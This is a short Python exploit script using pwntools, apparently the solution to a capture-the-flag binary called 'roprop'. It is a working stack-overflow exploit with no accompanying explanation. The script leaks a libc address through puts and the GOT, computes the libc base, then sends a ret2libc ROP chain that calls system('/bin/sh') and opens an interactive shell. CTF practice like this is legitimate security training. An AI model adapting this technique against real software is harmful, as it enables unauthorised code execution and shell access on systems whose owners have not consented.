#!/usr/bin/env python3
from pwn import *

binary = ELF('./roprop')
libc = binary.libc

rop = ROP([binary])
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

def leak():
    payload  = b'A' * 88
    payload += p64(pop_rdi)
    payload += p64(binary.got.puts)
    payload += p64(binary.plt.puts)
    payload += p64(binary.sym.main)
    return payload

def exploit():
    payload  = b'A' * 88
    payload += p64(ret)
    payload += p64(pop_rdi)
    payload += p64(next(libc.search(b'/bin/sh')))
    payload += p64(libc.sym.system)
    return payload

if __name__ == '__main__':
    p = process(binary.path)
    
    p.sendlineafter(b'He have got something for you since late 19\'s.\n\n', leak())
    
    puts = u64(p.recv(6) + b'\0\0')
    libc.address = puts - libc.sym.puts
    
    p.sendlineafter(b'He have got something for you since late 19\'s.\n\n', exploit())
    
    p.interactive()